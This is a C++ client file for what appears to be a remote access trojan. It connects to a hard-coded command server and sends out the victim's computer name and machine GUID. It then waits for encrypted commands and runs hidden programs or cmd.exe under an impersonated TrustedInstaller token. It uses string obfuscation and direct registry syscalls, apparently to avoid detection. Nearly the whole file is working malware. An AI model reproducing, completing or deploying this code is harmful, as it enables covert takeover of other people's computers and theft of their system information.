#include "client.h"
#include "External/obfuscate.h"
#include "serialization.h"

#ifdef CLIENT_RELEASE

Client::Client() {
	NetCommon::LoadWSAFunctions();

	// setup udp addr

	hostent* host = GetHostByName(DNS_NAME.c_str());
	if ( host == NULL )
		return;

	sockaddr_in addr;
	memcpy(&addr.sin_addr, host->h_addr_list[0], host->h_length);
	addr.sin_family = AF_INET;
	addr.sin_port = HostToNetworkShort(UDP_PORT);

	// set udp server info
	this->m_UDPServerDetails.addr = addr;
	this->m_UDPServerDetails.domain = AF_INET;
	this->m_UDPServerDetails.port = UDP_PORT;
	this->m_UDPServerDetails.type = SOCK_DGRAM;

	RSAKeys gen = LGCrypto::GenerateRSAPair(4096);
	this->SetRequestSecrets(gen);
	SetRemoteMachineGUID();
	SetRemoteComputerName();
}

Client::~Client() {
	this->Disconnect(); // disconnect incase the socket is still connected

	CleanWSA();
	//m_ProcMgr.FreeUsedLibrary(std::string(HIDE("Ws2_32.dll")));
}

void Client::SetRemoteComputerName() {
	char  buffer[256];
	DWORD buffSize = sizeof(buffer);

	// get computer name
	BOOL success = GetComputerNameA(buffer, &buffSize);
	if ( success ) {
		this->m_ComputerName = buffer;
	}
}

BOOL Client::Connect() {
	// make request to udp server
	this->m_UDPSocket = CreateSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if ( this->m_UDPSocket == INVALID_SOCKET )
		return FALSE;

	ClientRequest request(ClientRequest::kConnectClient, 0, this->m_UDPSocket);

	OutputDebugStringA("sending");
	BOOL validServerResponse = SendMessageToServer(this->m_UDPServerDetails, request);
	if ( !validServerResponse )
		return FALSE;  
	OutputDebugStringA("sent");

	Server TCPServer;
	sockaddr_in serverAddr;
	BOOL received = NetCommon::ReceiveData(TCPServer, this->m_UDPSocket, UDP, serverAddr);
	if ( !received )
		return FALSE;

	this->m_UDPServerDetails.addr = serverAddr;
	this->m_TCPServerDetails = TCPServer;

	// connect to tcp server
	this->m_TCPSocket = CreateSocket(AF_INET, SOCK_STREAM, 0);
	if ( this->m_TCPSocket == INVALID_SOCKET )
		return FALSE;

	int connect = ConnectSocket(this->m_TCPSocket, ( sockaddr* ) &this->m_TCPServerDetails.addr, sizeof(this->m_TCPServerDetails.addr));
	if ( connect == SOCKET_ERROR )
		return FALSE;
	OutputDebugStringA("socket");

	RSAKeys keys = LGCrypto::GenerateRSAPair(4096);
	this->SetRequestSecrets(keys);

	ExchangePublicKeys();
	SendComputerNameToServer();
	SendMachineGUIDToServer();
	OutputDebugStringA("yes");

	return TRUE;
}

void Client::SetRemoteMachineGUID() {
	OBJECT_ATTRIBUTES obj;
	InitializeObjectAttributes(&obj, 0, 0, 0, 0);

	std::string hiddenRegPath = std::string(HIDE("\\Registry\\Machine\\Software\\Microsoft\\Cryptography"));
	std::wstring wide = std::wstring(hiddenRegPath.begin(), hiddenRegPath.end());

	UNICODE_STRING reg;
	reg.Buffer = wide.data();
	reg.Length = wide.size() * sizeof(wchar_t);
	reg.MaximumLength = sizeof(reg.Buffer);

	std::string hiddenName = std::string(HIDE("MachineGuid"));
	std::wstring name = std::wstring(hiddenName.begin(), hiddenName.end());

	UNICODE_STRING valueName;
	valueName.Buffer = name.data();
	valueName.Length = name.size() * sizeof(wchar_t);
	valueName.MaximumLength = sizeof(valueName.Length);

	obj.Length = sizeof(OBJECT_ATTRIBUTES);
	obj.RootDirectory = NULL;
	obj.ObjectName = &reg;
	obj.SecurityDescriptor = NULL;
	obj.SecurityQualityOfService = NULL;
	obj.Attributes = OBJ_CASE_INSENSITIVE;

	HANDLE key;
	SysNtOpenKey(&key, GENERIC_READ, &obj);

	char buffer[512];
	u_long size;
	SysNtQueryValueKey(key, &valueName, KeyValuePartialInformation, buffer, sizeof(buffer), &size);
	PKEY_VALUE_PARTIAL_INFORMATION pk = ( PKEY_VALUE_PARTIAL_INFORMATION ) buffer;
	std::wstring data = ( wchar_t* ) pk->Data;
	std::string string = std::string(data.begin(), data.end());
	this->m_MachineGUID = string;
}

BYTESTRING Client::MakeTCPRequest(const ClientRequest& req, BOOL encrypted) {

	//BOOL sent = encrypted ? SendEncryptedMessageToServer(this->m_TCPServerDetails, req) : SendMessageToServer(this->m_TCPServerDetails, req);
	BOOL sent = FALSE;

	if ( encrypted )
		sent = NetCommon::TransmitData(req, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, this->m_ServerPublicKey, FALSE);
	else
		sent = NetCommon::TransmitData(req, this->m_TCPSocket, TCP);

	if ( !sent ) return {};

	BYTESTRING serverResponse;
	BOOL received = NetCommon::ReceiveData(serverResponse, this->m_TCPSocket, TCP, NetCommon::_default, encrypted, this->m_RequestSecrets.priv, TRUE);
	if ( !received ) return {};

	return serverResponse;
}

BOOL Client::SendComputerNameToServer() {
	return SendMessageToServer(this->m_ComputerName, TRUE);
}

BOOL Client::SendMachineGUIDToServer() {
	return SendMessageToServer(this->m_MachineGUID, TRUE);
}

BOOL Client::PerformCommand(const ServerCommand& command, ClientResponse& outResponse) {
	BOOL success = FALSE;

	switch ( command.action ) {
	case RemoteAction::kPingClient:
		success = TRUE;
		break;
	case RemoteAction::kOpenRemoteProcess:
		CLIENT_DBG("opening elevated process");

		STARTUPINFO si = { 0 };
		PROCESS_INFORMATION pi = { 0 };
		uint32_t creationFlags = NULL;
		HANDLE context = NULL;
		std::string application = ""; // no application

		if ( command.flags & NO_CONSOLE ) {
			si.wShowWindow = SW_HIDE;
			si.dwFlags = STARTF_USESHOWWINDOW;
		}
		else if ( ( command.flags & NO_CONSOLE ) == 0 ) // show console
			creationFlags |= CREATE_NEW_CONSOLE;

		if ( command.flags & RUN_AS_NORMAL )
			context = this->m_ProcMgr.GetToken();
		else if ( command.flags & RUN_AS_HIGHEST ) 
			context = this->m_ProcMgr.GetTrustedInstallerToken();

		if ( command.flags & USE_CLI ) {
			application = std::string(HIDE("\"C:\\Windows\\System32\\cmd.exe\"")); // use cmd.exe
			// buffer are the command line args
			std::string cla(command.buffer, command.buffLen);
			application += " ";
			application += cla;
		}
		else if ( ( command.flags & USE_CLI ) == 0 ) // opening regular process
			application = std::string(command.buffer, command.buffLen);

		success = this->m_ProcMgr.OpenProcessAsImposter(
			this->m_ProcMgr.GetTrustedInstallerToken(),
			0,
			NULL,
			std::wstring(application.begin(), application.end()).data(),
			creationFlags,
			NULL,
			NULL,
			&si,
			&pi
		);

		CLIENT_DBG("opened...");

		break;
	}

	if ( command.flags & RESPOND_WITH_STATUS ) {
		outResponse.actionPerformed = command.action;
		outResponse.responseCode = (success == TRUE) ? ClientResponseCode::kResponseOk : ClientResponseCode::kResponseError;
	}

	return success;
}

BOOL Client::IsServerAwaitingResponse(const ServerCommand& commandPerformed) {
	BOOL sendResponse = FALSE;
	switch ( commandPerformed.action ) {
	case RemoteAction::kPingClient:
		sendResponse = TRUE;
		break;
	}
	return sendResponse;
}

Packet Client::OnEncryptedPacket(BYTESTRING encrypted) {
	BYTESTRING decrypted    = LGCrypto::RSADecrypt(encrypted, this->m_RequestSecrets.priv, TRUE); 
	Packet     deserialized = Serialization::DeserializeToStruct<Packet>(decrypted);
	
	return deserialized;
}

void Client::ListenForServerCommands() {
	BOOL received = FALSE;
	while ( TRUE ) {
		BYTESTRING encrypted;

		received = NetCommon::ReceiveData(
			encrypted,
			this->m_TCPSocket,
			TCP
		);

		Packet receivedPacket = OnEncryptedPacket(encrypted);
		ClientResponse responseToServer;

		if ( receivedPacket.flags & PACKET_IS_A_COMMAND )
			PerformCommand(receivedPacket, responseToServer);

		// dont need to respond to server with 'responseToServer'
		if ( ( receivedPacket.flags & RESPOND_WITH_STATUS ) == 0 )
			continue;

		// respond to server with 'responseToServer'
		NetCommon::TransmitData(responseToServer, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, this->m_ServerPublicKey, FALSE);
	}
}

BOOL Client::ExchangePublicKeys() {
	int len = i2d_RSAPublicKey(this->m_RequestSecrets.pub, nullptr);
	unsigned char* data = NULL;

	i2d_RSAPublicKey(this->m_RequestSecrets.pub, &data);

	// Send size of private key first
	Send(this->m_TCPSocket, ( char* ) &len, sizeof(len), 0);
	// send der format of rsa key
	Send(this->m_TCPSocket, ( char* ) data, len, 0);
	CLIENT_DBG("sent client public key");

	free(data);

	// now receive the public key
	int clientLen = 0;
	Receive(this->m_TCPSocket, ( char* ) &clientLen, sizeof(clientLen), 0);
	unsigned char* clientDer = ( unsigned char* ) malloc(clientLen);
	Receive(this->m_TCPSocket, ( char* ) clientDer, clientLen, 0);
	const unsigned char* constDer = clientDer;
	RSA* rsaPubKey = d2i_RSAPublicKey(nullptr, &constDer, clientLen);
	this->m_ServerPublicKey = rsaPubKey;
	CLIENT_DBG("got servers public key");
	free(clientDer);
	return TRUE;
}

BOOL Client::SendMessageToServer(std::string message, BOOL encrypted) {	
	CLIENT_DBG(message.c_str());

	BYTESTRING serialized = Serialization::SerializeString(message);
	BOOL	   success    = FALSE;

	if ( encrypted ) {
		success = NetCommon::TransmitData(serialized, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, this->m_ServerPublicKey, FALSE);
	} else
		success = NetCommon::TransmitData(serialized, this->m_TCPSocket, TCP);

	return success;
}

BOOL Client::SendMessageToServer(const Server& dest, ClientMessage message) {
	if ( dest.type == SOCK_STREAM ) // tcp
		return NetCommon::TransmitData(message, this->m_TCPSocket, TCP);
	else if ( dest.type == SOCK_DGRAM ) // udp
		return NetCommon::TransmitData(message, this->m_UDPSocket, UDP, dest.addr);

	return FALSE;
}

BOOL Client::SendEncryptedMessageToServer(const Server& dest, ClientMessage message) {
	BOOL success = FALSE;
	if ( dest.type == SOCK_STREAM ) // tcp
		success = NetCommon::TransmitData(message, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, this->m_ServerPublicKey, FALSE);
	//else if ( dest.type == SOCK_DGRAM ) // udp
		//success = NetCommon::TransmitData(message, this->m_UDPSocket, UDP, dest.addr, TRUE, pk, FALSE);

	return success;
}

BOOL Client::Disconnect() {
	ClientRequest disconnectRequest(ClientRequest::kDisconnectClient);
	MakeTCPRequest(disconnectRequest, TRUE);

	CloseSocket(this->m_UDPSocket);
	int status = CloseSocket(this->m_TCPSocket);
	if ( status == SOCKET_ERROR )
		return FALSE;

	this->m_UDPSocket = INVALID_SOCKET;
	this->m_TCPSocket = INVALID_SOCKET;

	return TRUE;
}

#elif defined(SERVER_RELEASE)

Client::Client(SOCKET tcp, sockaddr_in addr)
	: AddressInfo(addr), m_TCPSocket(tcp)
{
	std::random_device gen;
	std::mt19937 rng(gen());
	std::uniform_int_distribution<std::mt19937::result_type> dist(1, 100000);
	this->ClientUID = dist(rng);
}

void Client::Disconnect() {
	if ( this->m_TCPSocket != INVALID_SOCKET )
		CloseSocket(this->m_TCPSocket);

	this->Alive = FALSE;
}

#endif
